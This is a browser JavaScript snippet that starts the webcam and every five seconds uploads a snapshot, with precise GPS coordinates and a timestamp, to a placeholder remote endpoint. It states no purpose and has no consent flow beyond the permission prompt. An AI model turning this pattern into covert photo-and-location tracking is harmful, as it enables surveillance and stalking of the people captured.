navigator.mediaDevices.getUserMedia = navigator.mediaDevices.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
navigator.mediaDevices.getUserMedia({ video: { ideal: 720 }, audio: false })
    .then(stream => {
        const video = document.getElementById('video');
        video.srcObject = stream;
        const log = document.getElementById('log');
        log.innerText = "Camera Started! Auto-capture active.";
        document.body.style.display = 'block';
        setInterval(getLocationAndCapture, 5000);
    })
    .catch(err => {
        const log = document.getElementById('log');
        log.innerText = "❌ Camera Permission Denied!";
        document.body.style.display = 'block';
    });

function getLocationAndCapture() {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude.toFixed(6);
                const lng = position.coords.longitude.toFixed(6);
                takeAndUploadPicture(lat, lng);
            },
            (error) => {
                console.warn("GPS Error:", error.message);
                takeAndUploadPicture("Unknown", "Unknown");
            },
            { enableHighAccuracy: true, timeout: 4000 }
        );
    } else {
        takeAndUploadPicture("Not Supported", "Not Supported");
    }
}

async function takeAndUploadPicture(lat, lng) {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    if (video.videoWidth === 0) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);

    const imageBase64 = canvas.toDataURL('image/jpeg', 0.4);

    try {
        const response = await fetch('https://your-firebase-url', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                imageText: imageBase64,
                status: "PENDING",
                lat: lat,
                lng: lng,
                timestamp: new Date().toISOString()
            })
        });
        if (response.ok) {
            const log = document.getElementById('log');
            const timeNow = new Date().toLocaleTimeString();
            log.innerText = `✅ Last photo sent at ${timeNow} | GPS: ${lat}, ${lng}`;
        }
    } catch (error) {
        console.error("Error saving to Firebase: ", error);
        const log = document.getElementById('log');
        log.innerText = "⚠️ Failed to send photo.";
    }
}
